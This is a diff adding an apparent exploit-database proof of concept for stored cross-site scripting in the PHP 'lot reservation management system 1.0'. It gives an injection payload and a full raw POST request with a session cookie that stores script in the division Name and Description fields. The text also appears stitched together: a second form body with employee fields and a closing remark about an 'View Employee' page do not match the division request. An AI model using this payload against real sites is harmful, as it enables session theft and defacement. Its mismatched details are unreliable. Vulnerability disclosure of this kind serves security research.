@@ -1,0 +1,87 @@
+#Exploit Title: lot reservation management system 1.0 - Stored Cross Site Scripting
+#Date: 2020-10-22
+#Exploit Author: Ankita Pal
+#Vendor Homepage: https://www.sourcecodester.com/php/14530/lot-reservation-management-system-using-phpmysqli-source-code.html
+#Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/lot-reservation-management-system.zip
+#Version: 1.0
+#Tested on: Windows 10 + xampp v3.2.4
+
+
+Proof of Concept:::
+
+Step 1: http://localhost:8081/lot-reservation-management-system/admin/index.php?page=divisions
+
+Step 2: Use payload <script>alert("XSS")</script> in Name and Discription.
+
+
+Malicious Request:::
+POST /lot-reservation-management-system/admin/ajax.php?action=save_division HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------65714323539404637092301409097
+Content-Length: 613
+Origin: http://localhost:8081
+Connection: close
+Referer: http://localhost:8081/lot-reservation-management-system/admin/index.php?page=divisions
+Cookie: PHPSESSID=q9kusr41d3em013kbe98b701id
+
+-----------------------------65714323539404637092301409097
+Content-Disposition: form-data; name="id"
+
+
+-----------------------------65714323539404637092301409097
+Content-Disposition: form-data; name="name"
+
+<script>alert("XSS")</script>
+-----------------------------65714323539404637092301409097
+Content-Disposition: form-data; name="description"
+
+<script>alert("XSS")</script>
+-----------------------------65714323539404637092301409097
+Content-Disposition: form-data; name="img"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------65714323539404637092301409097--
+
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="gender"
+
+Female
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="contact"
+
+9876543211
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="nid"
+
+12
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="address"
+
+Gujarat
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="dept"
+
+CS
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="degree"
+
+BE
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="salary"
+
+
+-----------------------------3267707159765331982713791736
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------3267707159765331982713791736--
+
+
+Cookie will be reflected on View Employee.
